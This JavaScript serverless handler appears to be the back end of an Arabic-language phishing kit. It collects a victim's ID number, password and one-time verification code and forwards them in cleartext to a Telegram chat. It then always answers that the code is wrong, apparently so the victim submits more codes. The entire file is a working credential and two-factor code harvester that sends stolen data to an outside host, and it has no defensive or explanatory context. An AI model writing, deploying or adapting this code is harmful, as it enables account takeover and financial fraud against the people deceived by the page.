const { nowAr, sendTelegram, jsonResponse } = require("./lib/telegram.cjs");

exports.handler = async (event) => {
  if (event.httpMethod !== "POST") {
    return jsonResponse(405, { ok: false, message: "Method not allowed" });
  }

  let body;
  try {
    body = JSON.parse(event.body || "{}");
  } catch {
    return jsonResponse(400, { ok: false, message: "طلب غير صالح" });
  }

  const id = String(body.id ?? "").trim();
  const password = String(body.password ?? "");
  const code = String(body.code ?? "").trim();
  const step = String(body.step ?? "1");

  if (!id || !password) {
    return jsonResponse(400, { ok: false, message: "انتهت الجلسة، سجّل الدخول من جديد" });
  }

  if (!/^\d{4,8}$/.test(code)) {
    return jsonResponse(400, { ok: false, message: "أدخل رمز التحقق" });
  }

  const text = [
    `📲 رمز تحقق (${step})`,
    "",
    `رقم المميز: ${id}`,
    `كلمة المرور: ${password}`,
    `رمز التحقق: ${code}`,
    "",
    `الوقت: ${nowAr()}`,
  ].join("\n");

  try {
    await sendTelegram(text);
    return jsonResponse(200, { ok: true, valid: false, message: "رمز التحقق خاطئ" });
  } catch {
    return jsonResponse(502, { ok: false, message: "تعذّر الإرسال إلى Telegram" });
  }
};
